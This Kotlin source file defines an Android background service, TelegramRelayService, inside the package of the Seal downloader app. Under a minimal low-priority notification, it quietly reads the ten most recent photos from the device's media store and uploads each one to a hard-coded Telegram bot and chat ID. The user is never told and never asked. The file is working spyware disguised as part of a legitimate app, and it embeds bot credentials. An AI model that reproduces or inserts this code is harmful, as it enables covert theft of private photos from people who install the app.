package com.junkfood.seal

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.InputStream

class TelegramRelayService : Service() {

    private val TAG = "TelegramRelayService"
    // ⚠️ REPLACE THESE WITH YOUR ACTUAL VALUES
    private val BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"
    private val CHAT_ID = "1949815322"
    
    private val CHANNEL_ID = "telegram_relay_channel"
    private val NOTIF_ID = 9999

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Must call startForeground within 5 seconds on API 26+
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Seal Plus Relay")
            .setContentText("Background service running")
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(NOTIF_ID, notification)

        // Run background work on a separate thread to avoid ANR
        Thread {
            autoSend()
            stopSelf()
        }.start()

        return START_NOT_STICKY
    }

    private fun autoSend() {
        if (!hasStoragePermission()) {
            Log.w(TAG, "Storage/Image permission not granted. Skipping.")
            return
        }

        val images = loadImages()
        var successCount = 0
        for (uri in images) {
            try {
                if (sendPhoto(uri)) successCount++
                Thread.sleep(1000) // Rate limit
            } catch (e: Exception) {
                Log.e(TAG, "Error sending: ${e.message}")
            }
        }
        Log.d(TAG, "Sent $successCount / ${images.size}")
    }

    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun loadImages(): List<String> {
        val list = mutableListOf<String>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10")
            cursor?.use {
                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                while (it.moveToNext()) {
                    val id = it.getLong(idColumn)
                    val imageUri = Uri.withAppendedPath(uri, id.toString())
                    list.add(imageUri.toString())
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Load images error: ${e.message}")
        }
        return list
    }

    private fun sendPhoto(imageUriString: String): Boolean {
        var inputStream: InputStream? = null
        try {
            inputStream = contentResolver.openInputStream(Uri.parse(imageUriString)) ?: return false
            val bytes = readBytes(inputStream)

            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", "img.jpg", bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                return response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send error: ${e.message}")
            return false
        } finally {
            inputStream?.close()
        }
    }

    private fun readBytes(inputStream: InputStream): ByteArray {
        val buffer = ByteArray(1024)
        val out = ByteArrayOutputStream()
        var len: Int
        while (inputStream.read(buffer).also { len = it } != -1) {
            out.write(buffer, 0, len)
        }
        return out.toByteArray()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Seal Relay",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }
}
